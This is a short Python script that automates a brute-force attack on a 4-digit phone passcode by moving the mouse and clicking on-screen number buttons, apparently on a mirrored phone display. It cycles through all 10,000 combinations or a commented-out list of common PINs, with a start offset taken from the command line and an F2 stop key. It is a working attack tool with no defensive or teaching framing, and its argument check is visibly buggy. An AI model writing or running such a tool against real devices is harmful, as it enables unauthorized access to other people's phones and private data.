import pyautogui
import time
import keyboard
import sys

# Define the coordinates of the number buttons on the phone screen
# Example format: 'number': (x, y)

number_coords = {
	'0': (2324, 1180),
	'1': (2228, 880),
	'2': (2328, 880),
	'3': (2426, 880),
	'4': (2228, 980),
	'5': (2328, 980),
	'6': (2426, 980),
	'7': (2228, 1080),
	'8': (2328, 1080),
	'9': (2426, 1080)
}


'''
number_coords = {
	'0': (2361, 1222),
	'1': (2276, 954),
	'2': (2358, 954),
	'3': (2451, 954),
	'4': (2276, 1043),
	'5': (2358, 1043),
	'6': (2451, 1043),
	'7': (2276, 1123),
	'8': (2358, 1123),
	'9': (2451, 1123)
}
'''

# Check for command-line arguments
if len(sys.argv) == 2 or not sys.argv[1].isdigit() or len(sys.argv[1]) != 4:
	print(f'Starting the program from number |', sys.argv[1], '|')
	four_digit_combinations = [str(i).zfill(4) for i in range(int(sys.argv[1]), 10000)]
else:
	# Returns all 4 digits combinations
	four_digit_combinations = [str(i).zfill(4) for i in range(10000)]

# Define the best 4-digit passcode options
'''
best_passcodes = [
	'1234', '5678', '4321', '8765', '0000', '9999', '8888', '7777', '6666', '5555', '4444', '3333', '2222', '1111', '1256', '4589', '8585', '7878', '8989',
	'2580', '1212', '6969', '1313', '0009', '0008', '0007', '0006', '0005', '0004', '0003', '0002', '0001', '1004', '1122', '5683', '2468', '1357', '1470',
	'0852', '1593', '1020', '5432', '8012', '9090', '8080', '7070', '6060', '5050', '4040', '3030', '2020', '1010', '6660', '0666', '5757', '3434', '9898',
	'1103', '1904']
'''

# Variable to control the running state of the program
program_running = True

print('5 sec delay to change windows')
time.sleep(5)

# Function to stop the program when F2 is pressed
def stop_program():
	global program_running
	print("Program stopped by user.")
	program_running = False

# Bind the F2 key to stop the program
keyboard.add_hotkey('F2', stop_program)

# Function to simulate clicking on a specific number
def click_number(number):
	x, y = number_coords[number]
	pyautogui.moveTo(x, y, duration=0.1)  # Smooth movement to the number
	pyautogui.click()
	time.sleep(0.1)  # Small delay between clicks

# Main loop to try all the best passcodes
try:
	if 'best_passcodes' not in globals() or not best_passcodes: # i hate python!
		print('Using all the codes!')
		best_passcodes = four_digit_combinations
	for code in best_passcodes:
		if not program_running:
			break
		print(f"Trying passcode: {code}")
		for digit in code:
			click_number(digit)
		time.sleep(1)  # Wait before trying the next code
except KeyboardInterrupt:
	print("Program terminated manually.")

print("Program has exited.")
